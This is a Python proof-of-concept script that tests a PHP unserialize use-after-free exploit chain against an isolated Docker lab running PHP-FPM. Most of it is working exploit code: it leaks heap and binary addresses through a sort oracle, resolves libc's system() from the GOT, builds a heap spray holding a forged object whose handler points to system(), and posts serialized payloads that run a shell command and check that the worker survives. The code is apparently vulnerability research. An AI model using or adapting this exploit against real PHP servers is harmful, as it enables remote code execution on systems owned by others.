#!/usr/bin/env python3
"""Verify the wrong-object-first behavior in a json_encode tree for the
offset-table fire, and test the two proposed fixes. Isolated lab p2s-hz1 on
:8180.

The fire points the forged object's own handlers at the spray buffer
(per-object), not the global std_object_handlers -- so the CachedData gadget
keeps real handlers and a tree walk never fires it. This harness proves:
  A  get_object_vars normalise ....... FIRES (control)
  B  DIRECT json_encode of the tree .. NO crash, NO fire
  C  properties=NULL ................... json still no-fire; gov still fires
  D  (a) duplicate-key eviction ........ forged still fires via gov; spray+R: survive

Leak+resolve run over order.php (no echo); the fire is delivered to the given
endpoint. Success = in-container marker uid=33 AND worker pid stable (survived).

  docker compose -f docker-compose.fpm-avenues.yml -p p2s-hz1 --profile hz1 up -d --build
  python3 -I poc/chains/verify_offsets_fire_hazard1.py
"""
import argparse, importlib.util, os, socket, struct, subprocess, sys, time, urllib.request
from urllib.parse import quote_from_bytes, urlsplit
_POC = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(_POC)  # poc/
def _load(f):
    _path = os.path.join(_POC, f)
    if not os.path.exists(_path): _path = os.path.join(_POC_ROOT, f)
    spec = importlib.util.spec_from_file_location(f[:-3], _path)
    m = importlib.util.module_from_spec(spec)
    for _p in (_POC, _POC_ROOT):
        if _p not in sys.path: sys.path.insert(0, _p)
    spec.loader.exec_module(m); return m
F = _load("fpm_offsets_fire.py"); X = _load("primitives/oracles/sideeffect_exfil_apps.py"); seo = X._seo
CONTAINER = "p2s-hz1-fpm"; MARKER = "/tmp/hz1m"; CMD = b"id>" + MARKER.encode()
HOST, PORT = "127.0.0.1", 8180

def mreset(): subprocess.run(["docker","exec",CONTAINER,"sh","-c",f"rm -f {MARKER}"],capture_output=True)
def mread(): return subprocess.run(["docker","exec",CONTAINER,"sh","-c",f"cat {MARKER} 2>/dev/null"],capture_output=True,text=True).stdout.strip()
def pid():
    try: return urllib.request.urlopen(f"http://{HOST}:{PORT}/pid.php",timeout=5).read().decode().strip()
    except Exception: return "ERR"
def fire(path, payload):
    body = b"rows=" + quote_from_bytes(payload).encode(); s = socket.socket(); s.settimeout(5)
    req = (f"POST {path} HTTP/1.1\r\nHost: {HOST}\r\nContent-Type: application/x-www-form-urlencoded\r\n"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body
    st = b""
    try:
        s.connect((HOST,PORT)); s.sendall(req); d = s.recv(65536); st = d.split(b"\r\n",1)[0]
        while s.recv(65536): pass
    except OSError: st = b"OSErr"
    finally: s.close()
    return st.decode(errors="replace")

def _sp(ce, system, spray_addr, gpf_off, properties):
    cmd = b"\x09" + CMD; L = seo.SPRAY_LEN; sp = bytearray(L); fake_obj = spray_addr + 104
    struct.pack_into("<Q",sp,40,fake_obj); struct.pack_into("<I",sp,48,0x08)
    sp[104:104+len(cmd)] = cmd; sp[104+len(cmd)] = 0
    struct.pack_into("<Q",sp,120,ce); struct.pack_into("<Q",sp,128,spray_addr)
    struct.pack_into("<Q",sp,136,properties); struct.pack_into("<Q",sp,gpf_off,system)
    return bytes(sp)
def payload_std(ce,system,spray,gpf,properties=1):
    sp=_sp(ce,system,spray,gpf,properties); L=seo.SPRAY_LEN; total=1+seo.SPRAY_COUNT+1
    parts=[f"i:0;{seo._C_PART}".encode("latin-1")]
    for i in range(seo.SPRAY_COUNT): parts.append(f'i:{i+1};s:{L}:"'.encode("latin-1")+sp+b'";')
    parts.append(f"i:{seo.SPRAY_COUNT+1};R:{seo.REF_BASE};".encode("latin-1"))
    return b"a:"+str(total).encode()+b":{"+b"".join(parts)+b"}"
def payload_evict(ce,system,spray,gpf,properties=1):   # second i:0 evicts CachedData after its UAF fires
    sp=_sp(ce,system,spray,gpf,properties); L=seo.SPRAY_LEN; total=2+seo.SPRAY_COUNT+1
    parts=[f"i:0;{seo._C_PART}".encode("latin-1"), b'i:0;s:5:"hello";']
    for i in range(seo.SPRAY_COUNT): parts.append(f'i:{i+1};s:{L}:"'.encode("latin-1")+sp+b'";')
    parts.append(f"i:{seo.SPRAY_COUNT+1};R:{seo.REF_BASE};".encode("latin-1"))
    return b"a:"+str(total).encode()+b":{"+b"".join(parts)+b"}"

def resolve():
    http=X.Http(HOST,PORT); sort=X.OrderAdapter(http,"/order.php")
    if not sort.detect(): raise SystemExit("order.php not a sort sink (is p2s-hz1 up?)")
    _,chunk=X.exfil_chunk_pointer(sort,log=lambda*a,**k:None)
    bb,dtor,_=X.exfil_binbase(sort,chunk,X.OBJ_OFF_SORT,log=lambda*a,**k:None)
    if bb is None: raise SystemExit("binbase not 2MB-aligned (retry)")
    t=F.select_table(dtor); rdr=F.SortReader(X,sort)
    system=rdr.read_qword(bb+t["GOT_FREE_SLOT"])-t["LIBC_FREE_OFF"]+t["LIBC_SYSTEM_OFF"]
    ce=rdr.read_qword(bb+t["CSD_BSS_OFF"]); spray=chunk+t["SPRAY_FIRE_OFF"]+0x18
    return ce,system,spray,t["GPF_HANDLER_OFF"]

def trial(label, builder, fire_path, properties, n):
    print(f"\n== {label} (props={properties}) -> {fire_path} ==")
    hits=0
    for i in range(n):
        ce,system,spray,gpf=resolve(); pl=builder(ce,system,spray,gpf,properties)
        p0=pid(); mreset(); st=fire(fire_path,pl); time.sleep(0.4); m=mread(); p1=pid()
        fired=bool(m) and "uid=33" in m; hits+=fired; surv=p0==p1 and p0.startswith("pid=")
        print(f"  run{i+1}: {'FIRE uid=33' if fired else 'no-fire'} | http={st!r} | {p0}->{p1} {'SURVIVED' if surv else 'RESPAWN/DIED'}")
    print(f"  => {hits}/{n} fired"); return hits

def main(argv=None):
    ap=argparse.ArgumentParser(); ap.add_argument("--runs",type=int,default=3); a=ap.parse_args(argv)
    n=a.runs
    gov = trial("A  get_object_vars normalise (control)", payload_std, "/jsonnorm.php", 1, n)
    jt  = trial("B  DIRECT json_encode of tree (Hazard-1)", payload_std, "/jsontree.php", 1, n)
    trial("C1 get_object_vars, properties=NULL", payload_std, "/jsonnorm.php", 0, n)
    trial("C2 json_encode direct, properties=NULL", payload_std, "/jsontree.php", 0, n)
    ev  = trial("D  (a) evict CachedData -> get_object_vars", payload_evict, "/jsonnorm.php", 1, n)
    print("\n== VERDICT ==")
    print(f"  Hazard 1 (wrong-object crash): {'REFUTED (B no crash, worker alive)' if jt==0 else 'SEEN'}")
    print(f"  fix (a) eviction spray+R: survival: {'OK' if ev==n else 'FAIL'} ({ev}/{n})")
    print(f"  get_object_vars firing sink: {gov}/{n}")
    return 0 if (gov==n and jt==0 and ev==n) else 1

if __name__ == "__main__":
    sys.exit(main())
